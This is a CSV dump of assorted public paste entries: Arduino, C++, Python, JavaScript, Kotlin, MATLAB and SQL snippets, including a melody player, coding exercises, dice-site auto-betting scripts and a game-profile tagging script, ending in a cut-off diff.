id,title,username,language,date,content
zNugMrzi,Sound trigger/play tune,learnelectronics,Arduino,Monday 28th of August 2023 06:59:15 AM CDT,"/****************************************
 *                                      *
 *      Sound Trigger/Play Tune         *
 *                                      *
 *      Learnelectronics (C)2023        *
 *                                      *
 *                                      *
 ****************************************/


// Define the digital pin for input and output
const int inputPin = 3;
const int outputPin = 6;

// Define the notes for the Imperial March melody
#define NOTE_B0 31
#define NOTE_C1 33
#define NOTE_B0 31
#define NOTE_C1 33
#define NOTE_D1 37
#define NOTE_E1 41
#define NOTE_F1 44
#define NOTE_G1 49
#define NOTE_A1 55
#define NOTE_B1 62
#define NOTE_C2 65
#define NOTE_D2 73
#define NOTE_E2 82
#define NOTE_F2 87
#define NOTE_G2 98
#define NOTE_A2 110
#define NOTE_B2 123
#define NOTE_C3 131
#define NOTE_D3 147
#define NOTE_E3 165
#define NOTE_F3 175
#define NOTE_G3 196
#define NOTE_A3 220
#define NOTE_B3 247
#define NOTE_C4 262
#define NOTE_D4 294
#define NOTE_E4 330
#define NOTE_F4 349
#define NOTE_G4 392
#define NOTE_A4 440
#define NOTE_B4 494
#define NOTE_C5 523
#define NOTE_D5 587
#define NOTE_E5 659
#define NOTE_F5 698
#define NOTE_G5 784
#define NOTE_A5 880
#define NOTE_B5 988
#define NOTE_C6 1047
#define NOTE_D6 1175
#define NOTE_E6 1319
#define NOTE_F6 1397
#define NOTE_G6 1568
#define NOTE_A6 1760
#define NOTE_B6 1976
#define NOTE_C7 2093
#define NOTE_D7 2349
#define NOTE_E7 2637
#define NOTE_F7 2794
#define NOTE_G7 3136
#define NOTE_A7 3520
#define NOTE_B7 3951
#define NOTE_C8 4186
#define NOTE_D8 4699
#define NOTE_REST 100


int imperialMarch[] = {
  // Star Wars Imperial March
  NOTE_G4, NOTE_G4, NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4,
  NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4, NOTE_G5, NOTE_G4,
  NOTE_E5, NOTE_D5, NOTE_D5, NOTE_C5, NOTE_C5,
  NOTE_B4, NOTE_C5, NOTE_D5, NOTE_E5, NOTE_G4,
  NOTE_A4, NOTE_C5, NOTE_E5, NOTE_G5, NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4,
  NOTE_G4, NOTE_E4, NOTE_A4, NOTE_A4, NOTE_G5, NOTE_G4,
  NOTE_E5, NOTE_D5, NOTE_D5, NOTE_C5, NOTE_C5,
  NOTE_B4, NOTE_C5, NOTE_D5, NOTE_E5, NOTE_G4
};

// Define the note durations
int noteDurations[] = {
  4, 4, 4, 4, 4, 4,
  4, 4, 4, 4, 4, 4,
  4, 8, 8, 4, 4,
  4, 8, 8, 4, 4,
  4, 4, 4, 4, 4, 4, 4, 4,
  4, 4, 4, 4, 4, 4,
  4, 8, 8, 4, 4,
  4, 8, 8, 4, 4
};

void setup() {
  // Set the input and output pins
  pinMode(inputPin, INPUT);
  pinMode(outputPin, OUTPUT);
  digitalWrite(outputPin, LOW); // Ensure the output is initially off
}

void loop() {
  // Wait for a low signal on digital pin 3
  while (digitalRead(inputPin) == HIGH) {
    delay(10); // Check the input pin every 10 milliseconds
  }

  // If a low signal is detected, play the Imperial March
  playImperialMarch();
}

void playImperialMarch() {
  // Iterate through the Imperial March melody and play each note
  for (int i = 0; i < sizeof(imperialMarch) / sizeof(int); i++) {
    int noteDuration = 1000 / noteDurations[i];
    tone(outputPin, imperialMarch[i], noteDuration);
    int pauseBetweenNotes = noteDuration * 1.30; // Add a little extra time for spacing between notes
    delay(pauseBetweenNotes);
    noTone(outputPin);
  }
}
"
ie5uM8TT,Untitled,Skos_Martren,C++,Monday 28th of August 2023 06:58:19 AM CDT,"// https://e-maxx.ru/algo/maximum_average_segment --> Алгоритм 1

class Solution {

public:

    int maxSubArray(vector<int>& nums) {
        
        // ""nums.front()"" существует ввиду ""1 <= nums.length <= 10^5""
        int PrefixSum = nums.front(); // ""int"" <-- 10^5 * 10^4 <-- 1 <= nums.length <= 10^5 AND -10^4 <= nums[i] <= 10^4
        int totalMax = nums.front(); // ограничения на totalMax следуют из ограни-й PrefixSum
        int MinPrefixSum = nums.front(); // берем минимальный префикс из отрезка [0, i - 1]

        for(int i = 1; i < nums.size(); ++i){

            PrefixSum += nums[i];

            /*  PrefixSum - MinPrefixSum == MaxSuffixSum на [0, i] -- ввиду того, что минимизируем вычитаемое для каждого 
               возможного значения PrefixSum */
            totalMax = max(totalMax, PrefixSum - MinPrefixSum); // в данной строке в MinPrefixSum записано значения из [0, i - 1]


            MinPrefixSum = min(MinPrefixSum, PrefixSum); // минимум либо был достигнут ранее -- MinPrefixSum, либо получен при последнем подсчете -- PrefixSum
        }

        return totalMax; 

    }
};"
scTRzyBG,# re_skip_quoted_etc.py,here2share,Python,Monday 28th of August 2023 06:54:00 AM CDT,"# re_skip_quoted_etc.py

import re

input_line = '''HEY 'Python World!' THIS IS A TEST LINE ""WITH SOME QUOTES"".\nHERE IS A LINE WITH """"\""TRIPLE QUOTES""\"""" included!\nI'M ALSO GLAD IT'S GREAT AT IGNORING APOSTROPHES.'''
regexed = re.findall(r'(""[^""]+""|\'[^\']+\'|""""""[^""]+""""""|\S+|\’[^\’]+\’|\n\s*|\s+)', input_line)

output = []
s = ''
for r in regexed:
	if r.startswith(('""', ""'"")):
		output += [s, r]
		s = ''
	elif r == '\n ':
		output += ['\n']
	else:
		for i, c in enumerate(r):
			s += c.lower() if i % 2 == 0 else c.upper()
		s += ''

output += [s]
output = ''.join(output)

print(output)"
zPAwNb1b,long live snowybot,coinwalk,JavaScript,Monday 28th of August 2023 06:42:45 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var gobbie = ((kozster/1000).toFixed(7));
var zeggar = gobbie;
var target = 50000;
var tens = (gobbie*10);
var sevens = (gobbie*6.1);
var eights = (gobbie*7.9);
var burgzie = kozster;
var zimple = kozster;
var blowzy = false;
var smick = ((Math.floor(kozster/tens))*tens);
var dude = ((Math.floor(kozster/tens))*tens);
var joe = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var boggart = 0;
var bear = true;
var tuba = ((Math.floor(kozster/tens))*tens);
var razzle;
var final = document.getElementById('me').firstChild.lastChild.firstChild.children[7].innerText;
var oldDegen = 0;
var nope = 1;
 
 
function go(){
burgzie = $('#pct_balance').val();
var bog = ((burgzie-kozster).toFixed(8));
console.log(""profit:"");
console.log(bog);
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie>tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie<tuba)){
    zeggar = zeggar*2;
	nope = 0;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))){
    zeggar = gobbie*2;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie<=(dude-(tens*3)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 0;
    dude = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>=(dude+(tens*3)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 0;
    dude = ((Math.floor(burgzie/tens))*tens);
	}
if (burgzie>=target){
console.log(""snowybot rocks"");
return;
}
doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var coldbet = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var milk = document.getElementById('me').firstChild.lastChild.firstChild.children[11].innerText;
if ((milk==razzle)&&(boggart>=1)&&(doh>joe)&&(!bear)){
final = document.getElementById('me').firstChild.lastChild.firstChild.children[7].innerText;
joe = parseFloat(doh);
bear = true;
}
if ((final<49.5000)&&(blowzy)&&(boggart>=1)){
zimple = zimple+zeggar
blowzy = false;
}
if ((final>=49.5000)&&(blowzy)&&(boggart>=1)){
zimple = zimple-zeggar;
blowzy = false;
}
var ficked = ((zimple*1).toFixed(7));
var migg = ((burgzie*1).toFixed(7));
if (((milk!=razzle)&&(boggart>=1)&&(doh>joe))||((ficked!=migg)&&(blowzy))){
console.log(""hacker attacked you with"");
console.log(milk);
console.log(""bet number of attack:"");
console.log(coldbet);
return;
}
if ((doh==joe)&&(bear)){
razzle = ((zeggar*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo').click();
boggart = boggart+1;
blowzy = true;
bear = false;
doh = 0;
} 
setTimeout(() => go(), 1);
}
go();

"
uKsajnxF,Untitled,joxeankoret,C++,Monday 28th of August 2023 06:29:41 AM CDT,"union valor_numerico_t {
  int entero;
  double flotante;
};

void foo(void)
{
  valor_numerico_t valor;
  // Se puede acceder a su valor como entero
  valor.entero = 1;
  // O como double
  valor.flotante = 3.14;
}


"
7K50xW4T,scr,soodalpie,JavaScript,Monday 28th of August 2023 06:12:31 AM CDT,"// 클릭 이벤트 핸들러
function handleClick() {
  console.log(""자동으로 실행되는 콘솔 명령어"");

  // 서길연 멤버 번호 리스트
  var team_user = ['1259113880', '1694882774', '151813745', '1594540715', '352970544', '872967679', '1090710587', '772191263', '839862949', '1795641065', '1829112137', '1325781095', '1308908625', '1627595738', '521073076', '1057945255', '302159888', '940512317', '1342958680', '335950711', '1443834180', '1175409261', '537009034', '1410222174', '906963770', '1259039800', '621749594', '2080521746', '1007310925', '671323354', '1980157963', '1627866554', '940019294', '1879312402', '1342958680', '1929666668', '1174443015', '151649295', '2130995909', '420016428', '671323354', '671452830', '604771804', '353935', '520695858', '1762571676', '520695858', '520695858', '1762571676', '1090710587', '1426688922', '2030469499', '1057964322', '1980481357', '939828838', '353227658', '118243585', '1846004196', '1342449385', '1947150124', '1376155044', '84566175', '335961989', '1308792077', '1326099711', '1208268272', '1896427731', '1141349635', '386453798', '872967679',  '1275320123', '1560788620', '621415548', '520695858', '1275320123', '252601628', '1325613165', '1745097357', '1795749353', '503919126', '1041182379', '1443264852', '353206787', '101482955', '1678270158', '1829400533', '1326084152', '33896287', '369193016', '17537349', '1376117163', '1007616574', '1527728354', '1627900733', '451038', '1779382465', '1040911446', '451038', '1779382465', '1040911446', '906442720', '839870735', '386247375', '805981030', '1510632878', '638017497', '1376031127', '1996754520', '872904096', '655238754', '1409944719', '403654075'];  // 원하는 번호들을 이 배열에 추가

  // 서길연 유죄작 등록자 번호 리스트
  var guiltyWorksList = ['101189220', '1057327359', '1141806546', '1174917084', '1224874545', '1225379840', '1258650033', '1309165463', '1326332792', '1544429918', '1594026858', '1661489570', '1661864153', '168589158', '1728583190', '1829405965', '1879922225', '1896205267', '1997448017', '285368666', '285838250', '286435755', '319243982', '520645875', '554210566', '604959168', '638378243', '788773770', '873266367', '873270006', '906237157', '906364746', '973998995', '1007294149', '1694949274', '1309604929', '1544316968', '269411292', '1695290429', '604798562', '285838250', '1963929393', '352773124', '1392578475', '1611306444', '369417313', '990229920', '973848970', '1845722178', '369417313', '1879922225', '906699535', '1090845015', '1175347997', '520396027', '1627743010', '1376590063', '1392578475', '1258975750', '1141757927', '637834413', '2131625177', '2081072296', '17360065', '302358132'];
  
  // 숫자 추출 함수
  function extractNumbers() {
    var elements = document.querySelectorAll(""#container > div.content > div.papers > div.grid > div.box.gd-4.report > ul > div.simplebar-wrapper > div.simplebar-mask > div > div > div > li > div.msg"");
    var numbers = [];

    for (var i = 0; i < elements.length; i++) {
      var text = elements[i].textContent;
      var regex = /\/(\d+)\//g; // 숫자를 포함하는 정규식 패턴 (/숫자/)
      var matches = text.match(regex);
      if (matches !== null) {
        for (var j = 0; j < matches.length; j++) {
          var number = matches[j].replace(/\//g, ''); // /를 제거하여 숫자만 추출
          numbers.push(number);
        }
      }
    }

    return numbers;
  }

  // 닉네임 및 클랜 정보 업데이트
  function updateNicknameAndClan(nickname, clan) {
    var nicknameElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.nickname"");
    var clanElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.subject"");
    var tagElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.tag"");

    nicknameElement.textContent = nickname;
    clanElement.textContent = clan;

    if (team_user.includes(numbers[currentIndex])) {
      tagElement.innerHTML = ""<div style='width: 220px; height: 70px; background-color: #008080; color: white; font-size: 18px; text-align: center; line-height: 70px; margin: auto;'>서길연 무죄작 등록자</div>"";
    } else if (guiltyWorksList.includes(numbers[currentIndex])) {
      tagElement.innerHTML = ""<div style='width: 220px; height: 70px; background-color: #FF6F61; color: white; font-size: 18px; text-align: center; line-height: 70px; margin: auto;'>서길연 유죄작 등록자</div>"";
    } else {
      tagElement.innerHTML = """"; // 기본 상태로 되돌리기
    }
  }

  // 다음 페이지로 이동
  function goToNextPage() {
    var nextButton = document.querySelector(""#container > div.content > div.papers > div.paper > a.next"");
    if (nextButton) {
      nextButton.click();
    }
  }

  // 숫자 추출
  var numbers = extractNumbers();

  if (numbers.length > 0) {
    console.log(""인식한 숫자들:"", numbers);

    // API 호출 및 사용자 정보 표시
    var currentIndex = 0;

    function fetchCharacterInfo() {
      if (currentIndex >= numbers.length) {
        console.log(""모든 숫자에 대한 사용자 정보를 가져왔습니다."");
        return;
      }

      var apiUrl = `https://barracks.sa.nexon.com/api/Profile/GetProfileMain/${numbers[currentIndex]}`;

      fetch(apiUrl, {
        method: ""POST""
      })
        .then(response => response.json())
        .then(data => {
          console.log(""API 응답:"", data);
          var characterInfo = data.result?.characterInfo;
          if (characterInfo) {
            var userNick = characterInfo.user_nick;
            if (team_user.includes(numbers[currentIndex])) {
              var tagElement = document.querySelector(""#container > div.content > div.papers > div.grid > div.box.gd-1.summary > div.tag"");
              if (tagElement) {
                tagElement.innerHTML = ""<div style='width: 220px; height: 70px; background-color: #adadad; color: white; font-size: 18px; text-align: center; line-height: 70px; margin: auto;'>서길연 무죄작 등록자</div>"";
              }
            }
            var clanName = characterInfo.clan_name;
            console.log(`사용자 정보 (${numbers[currentIndex]}):`);
            console.log(""  사용자 닉네임:"", userNick);
            console.log(""  클랜 이름:"", clanName);
            updateNicknameAndClan(userNick, clanName); // 닉네임 및 클랜 정보 업데이트
          } else {
            console.log(`사용자 정보를 찾을 수 없습니다. (${numbers[currentIndex]})`);
          }

          currentIndex++;
          fetchCharacterInfo(); // 다음 숫자에 대한 사용자 정보 가져오기
        })
        .catch(error => {
          console.error(""API 호출 중 오류가 발생했습니다:"", error);
        });
    }

    fetchCharacterInfo(); // 첫 번째 숫자에 대한 사용자 정보 가져오기
  } else {
    console.log(""숫자를 찾지 못했습니다."");
    goToNextPage(); // 다음 페이지로 이동
  }
}

// 특정 요소를 15번 반복해서 클릭
var targetElement = document.querySelector(""#container > div.content > div.papers > div.paper > a.next"");
var clickCount = 0;

function clickRepeatedly() {
  if (clickCount < 999) {
    if (targetElement) {
      targetElement.addEventListener(""click"", handleClick);
      targetElement.dispatchEvent(new Event(""click""));
      targetElement.removeEventListener(""click"", handleClick);
      clickCount++;
      setTimeout(clickRepeatedly, 1000);
    } else {
      console.log(""대상 요소를 찾지 못했습니다."");
    }
  }
}

clickRepeatedly();"
tdjaP8sP,book_update,FreedTV,JSON,Monday 28th of August 2023 06:03:59 AM CDT,"{
    ""newVersion"":1000000,
    ""updateBody"":"""",
    ""name"":"""",
    ""url"":""www.baidu.com""
}"
x3HGVTr2,Protergo Exercise #1 by Rama,Hannaichi,JavaScript,Monday 28th of August 2023 06:03:42 AM CDT,"const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');

const websiteUrls = [
  'https://example.com/website1',
  'https://example.com/website2',
  // Add more URLs as needed
];

// Function to scrape product information from a website
async function scrapeWebsite(url) {
  try {
    const response = await axios.get(url);
    const $ = cheerio.load(response.data);

    // Extract product information using CSS selectors
    const products = [];
    $('.product').each((index, element) => {
      const name = $(element).find('.product-name').text().trim();
      const price = $(element).find('.product-price').text().trim();
      const details = $(element).find('.product-details').text().trim();

      products.push({ name, price, details });
    });

    return products;
  } catch (error) {
    console.error(`Error scraping ${url}: ${error.message}`);
    return [];
  }
}

// Function to scrape all websites and save the data in a structured way
async function scrapeWebsites() {
  try {
    const allProducts = [];

    for (const url of websiteUrls) {
      const products = await scrapeWebsite(url);
      allProducts.push(...products);
    }

    // Save the data as JSON
    const data = JSON.stringify(allProducts, null, 2);
    fs.writeFileSync('product_data.json', data);

    console.log('Scraping completed successfully!');
  } catch (error) {
    console.error('Error scraping websites:', error);
  }
}

// Start the scraping process
scrapeWebsites();
"
tEYQf8t5,data678,TestGuy1,JSON,Monday 28th of August 2023 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8390d6982c49025acf6aae5521dd556c9bd7bcc59451c371518573da6c3dbdbadcde18fb3683b1d8184107d3863610ed6de25681cd31e696d467780b1ccd183d5279c90528076547c5f5cc10b7793112fcbfa6711ff9d56302b881ffd61ccc08e43e59dc5531da92399207f7e6aac41717bad882a48b1d6e114e986ce79803fa',
  otherdata: [
    '89d41c6e6e96e994e5320560ff0dc080',
    '6900ad3ada39bb6e3b14ab9c8138b469',
    '317bee4119c1951c0ad43ee9d113af3c',
    '7e505c1e00ae2ebddf3bafa886bfe405',
    'a591503cc794f5c97d56ede721da715b',
    '1cbacd1588b82ac3d0e2e7f882fd395f',
    'fae6f9efe15c4467104efa9f8bd07cad',
    '3c60fc3c922b26204a2e5122103b4e31'
  ]
}"
Kq4ztx90,Untitled,wclovers,PHP,Monday 28th of August 2023 05:54:43 AM CDT,"add_filter( 'wcfm_is_allow_stripe_express_api', 'return_false' );"
MQBkAetZ,Weather Coroutines with Exception,Simonegaita,Kotlin,Monday 28th of August 2023 05:46:17 AM CDT,"import kotlinx.coroutines.*

fun main() {
    runBlocking {
        println(""Weather forecast"")
        println(getWeatherReport())
        println(""Have a good day!"")
    }
}

suspend fun getWeatherReport() = coroutineScope {
    val forecast = async { getForecast() }
    val temperature = async {
        try {
            getTemperature()
        } catch (e: AssertionError) {
            println(""Caught exception $e"")
            ""{ No temperature found }""
        }
    }

    ""${forecast.await()} ${temperature.await()}""
}

suspend fun getForecast(): String {
    delay(1000)
    return ""Sunny""
}

suspend fun getTemperature(): String {
    delay(500)
    throw AssertionError(""Temperature is invalid"")
    return ""30\u00b0C""
}"
YGXQD4pp,Course 5 - Solve with constraints,makispaiktis,MatLab,Monday 28th of August 2023 05:21:37 AM CDT,"clear all
close all
clc

% 1. Load the dataset
load Nutrition.mat 
food

% 2. Create the optimization problem
prob = optimproblem(""Description"",""An Optimal Breakfast"");
servings = optimvar(""servings"",16,""LowerBound"",0);
C = food.Price .* servings;
prob.Objective = sum(C);


% 3. Equality constraint
cals = servings .* food.Calories
totalCals = sum(cals)
prob.Constraints.calories = totalCals == 350

% 4. Solve the problem
[sol, optval] = solve(prob)
optServings = sol.servings
check = evaluate(totalCals, sol)

% 5. Visualize the solution and explain
bar(food.Name, optServings)
% Since we are looking for 350 calories, but as cheap as possible, then
% the output solution must have the biggest ratio calories / money
caloriesPerDollar = food.Calories ./ food.Price;
bar(food.Name, caloriesPerDollar)"
A1x3DexZ,book_list,FreedTV,JSON,Monday 28th of August 2023 05:19:21 AM CDT,"[
    {
        ""name"":""精品书源"",
        ""show"":true,
        ""type"":""book"",
        ""url"":""https://jihulab.com/aoaostar/legado/-/raw/release/cache/71e56d4f1d8f1bff61fdd3582ef7513600a9e108.json""
    }
]"
x8peqA8v,Course 4 - Constraints,makispaiktis,MatLab,Monday 28th of August 2023 05:02:29 AM CDT,"clear all
close all
clc

% 1. Load the dataset
load Nutrition.mat 
food

% 2. Create the optimization problem
prob = optimproblem(""Description"",""An Optimal Breakfast"");
servings = optimvar(""servings"", 16, ""LowerBound"", 0)
price = food.Price
C = servings .* price
prob.Objective = sum(C);
show(prob)
[sol, optval] = solve(prob)
sol.servings"
1377PaGt,Course 3 - Solve the optimization problem (fminunc is used),makispaiktis,MatLab,Monday 28th of August 2023 04:45:35 AM CDT,"clear all
close all
clc

% 1. Basics
prob = optimproblem(""Description"",""Factory Location"");
x = optimvar(""x"");
y = optimvar(""y"");
X = [5 40 70];
Y = [20 50 15];

% 2. Optimization problem
d = sqrt((x-X).^2 + (y-Y).^2);
dTotal = sum(d);
prob.Objective = dTotal;
show(prob)
initialGuess.x = 100;
initialGuess.y = 200;

% 3. Solve the problem (MATLAB automatically decides the solver - here it is 'fminunc')
[sol, optval] = solve(prob, initialGuess)
xOpt = sol.x
yOpt = sol.y
optval2 = evaluate(dTotal, sol)
vectors = evaluate(d, sol)
flag = optval == optval2

% 4. Display
plotStores
hold on
scatter(xOpt, yOpt, 'redX')
hold off



function plotStores()
	
	X = [5 40 70];
	Y = [20 50 15];
	pgon1 = nsidedpoly(5,""Center"",[X(1) Y(1)],""sidelength"",3);
	pgon2 = nsidedpoly(5,""Center"",[X(2) Y(2)],""sidelength"",3);
	pgon3 = nsidedpoly(5,""Center"",[X(3) Y(3)],""sidelength"",3);
	plot([pgon1 pgon2 pgon3])
	axis equal

end"
h4VbCgnh,Untitled,Pandaaaa906,T-SQL,Monday 28th of August 2023 04:45:13 AM CDT,"with mid_records as (
-- 加入row_number()，按prj_id分组，按raw_records.date 正序排序
    select records.*,
    row_number() over(partition by prj_id order by raw_records.date asc) prj_r  -- spoil alert: 出问题的地方
    from raw_records
), records as (
-- 加入last_date
    select mid_records.*, cast(null as datetime2) last_date
    from mid_records 
    where mid_records.prj_r = 1

union all

    select
    mid_records.*,
    case when datepart(year, last_record.date) = datepart(year, raw_records.date) and datepart(month, last_record.date) = datepart(month, raw_records.date) then last_record.last_date  -- 如果上一条是同一个月的，用上一条的last_date
    else last_record.date end last_date
    from records last_record
    join mid_records 
    on last_record.prj_id = raw_records.prj_id
    AND last_record.prj_r + 1 = raw_records.prj_r
)

select 
records.*, 
mat_summary.sum_value

from records

outter apply(
select
sum(value)
from mat 
where mat.prj_id = records.prj_id
and mat.date < last_second_of_month(records.date)  -- 取records.date当月以及之前未重复关联的mat进行汇总
and (records.last_date is null or mat.date > first_date_of_month(records.last_date))  
) mat_summary


"
cUZEfxM6,snowy fans only,coinwalk,JavaScript,Monday 28th of August 2023 04:39:06 AM CDT,"var kozster = parseFloat($('#pct_balance').val());
var gobbie = ((kozster/320).toFixed(4));
var zeggar = gobbie;
var target = 50000;
var tens = (gobbie*10);
var sevens = (gobbie*6.1);
var eights = (gobbie*7.9);
var burgzie = kozster;
var smick = ((Math.floor(kozster/tens))*tens);
var dude = ((Math.floor(kozster/tens))*tens);
var joe = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var boggart = 0;
var bear = true;
var tuba = ((Math.floor(kozster/tens))*tens);
var razzle;
var oldDegen = 0;
var nope = 1;
 
 
function go(){
burgzie = $('#pct_balance').val();
var bog = ((burgzie-kozster).toFixed(8));
console.log(""profit:"");
console.log(bog);
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie>tuba)){
    zeggar = zeggar*2;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))&&(burgzie != oldDegen)&&(burgzie<tuba)){
    zeggar = zeggar*2;
	nope = 0;
    oldDegen = parseFloat(burgzie);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>=(tuba+(tens*nope)))&&(burgzie>(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+eights))){
    zeggar = gobbie*2;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie<=(dude-(tens*10)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    dude = ((Math.floor(burgzie/tens))*tens);
}
if ((burgzie>(dude+(tens*3)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))&&(burgzie<tuba)){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    dude = ((Math.floor(burgzie/tens))*tens);
	}
if ((burgzie>=(smick+(gobbie*40)))&&(burgzie<(((Math.floor(burgzie/tens))*tens)+sevens))){
    zeggar = gobbie;
    oldDegen = 0;
    nope = 1;
    tuba = ((Math.floor(burgzie/tens))*tens);
    dude = ((Math.floor(burgzie/tens))*tens);
	smick = ((Math.floor(burgzie/tens))*tens);
}
if (burgzie>=target){
console.log(""snowybot rocks"");
return;
}
doh = document.getElementById('me').firstChild.lastChild.firstChild.children[5].innerText;
var milk = document.getElementById('me').firstChild.lastChild.firstChild.children[11].innerText;
if ((milk==razzle)&&(boggart>=1)&&(doh>joe)&&(!bear)){
joe = parseFloat(doh);
bear = true;
}
if ((milk!=razzle)&&(boggart>=1)&&(doh>joe)){
console.log(""hacker attack"");
console.log(""someone else played:"");
console.log(milk);
return;
}
if ((doh==joe)&&(bear)){
razzle = ((zeggar*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo').click();
boggart = boggart+1;
bear = false;
doh = 0;
}
setTimeout(() => go(), 1);
}
go();

"
zJtrT2Lm,marker,PaRat07,C++,Monday 28th of August 2023 04:32:34 AM CDT,"#include <vector>
#include <map>
#include <string>
#include <cassert>
#include ""serial.h""

class Marker {
    void write_to_marker(String message) {
        Serial.print(message + "";;"");
    }

    String read_from_marker() {
        String ans;
        bool not_end = true;
        while (not_end) {
            String buf1 = Serial.readStringUntil(';');
            ans += buf1;
            not_end = buf1.length() > 0;
        }
        return ans;
    }

    std::vector<String> separate(String to_separate, char separator) {
        std::vector<String> ans;
        String buf;
        for (char sym : to_separate) {
            if (sym == separator) {
                ans.push_back(std::move(buf));
            } else {
                buf += sym;
            }
        }
        if (buf.length() > 0) {
            ans.push_back(std::move(buf));
        }
        return ans;
    }
public:
    Marker() {
        Serial.begin(11500);
    }
    ~Marker() {
        Serial.end();
    }


    String open(String file) {
        write_to_marker(String(""OpenDoc,"") + file);
        return read_from_marker();
    }

    String set_pen_settings(int pen_id, int mark_speed, int power) {
        write_to_marker(String(""SetPen,ID"") + pen_id + "";MarkSpeed,"" + mark_speed + "";Power,"" + power);
        return read_from_marker();
    }

    String mark() {
        write_to_marker(""StartMark"");
        while (Serial.available() == 0) delay(100);
        return read_from_marker();
    }

    std::map<String, double> get_shape_pos(String primitive_name) {
        write_to_marker(String(""GetShapePos,"") + primitive_name);
        auto data = separate(read_from_marker(), ',');
        using namespace std;
        std::map<String, double> ans
                {
                        { ""x""      , data[1].toDouble() },
                        { ""y""      , data[2].toDouble() },
                        { ""height"" , data[3].toDouble() },
                        { ""width""  , data[4].toDouble() }
                };
        return ans;
    }

    String set_shape(String primitive, String content, double x = 0., double y = 0., bool pos_type = false) {
        write_to_marker(String(""SetShapeData,"") + primitive + "","" + content + "","" + x + "","" + y + "","" + pos_type);
        return read_from_marker();
    }

    String save() {
        write_to_marker(""SaveCurrentDoc"");
        return read_from_marker();
    }

    String change_content(String content) {
        String err;
        write_to_marker(""GetShapeList"");
        std::vector<String> primitives(separate(read_from_marker(), ';'));
        for (String prim : primitives) {
            auto was = get_shape_pos(prim);
            write_to_marker(String(""SetShapeData,"") + prim + "","" + content);
            err = read_from_marker();
            if (err != ""Ok"") return err;
            auto is = get_shape_pos(prim);
            double x_offset = (was[""x""] + was[""width""] / 2) - (is[""x""] + is[""width""] / 2);
            double y_offset = (was[""y""] + was[""height""] / 2) - (is[""y""] + is[""height""] / 2);
            err = set_shape(prim, """", x_offset, y_offset);
            if (err != ""Ok"") return err;
        }
        return err;
    }
};


void setup() {
    Marker m;
    assert(m.open(""test.bpd"") == ""Ok"");
    assert(m.set_pen_settings(0, 1000, 100) == ""Ok"");
    assert(m.change_content(""PaRat07"") == ""Ok"");
    assert(m.save() == ""Ok"");
    assert(m.mark() == ""Ok"");
}

void loop() {
    // put your main code here, to run repeatedly:
}
"
JU7XkaNP,Untitled,vpeter,Bash,Monday 28th of August 2023 04:28:15 AM CDT,"diff --git a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
index 1442916458..2f83d59a67 100755
--- a/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
+++ b/projects/Amlogic-ce/packages/linux-drivers/amlogic/opentee_linuxdriver/scripts/dovi-loader.sh
@@ -39,18 +39,25 @@ load_dovi_ne() {
     systemctl set-environment dmsetup_remove=yes
   fi
 
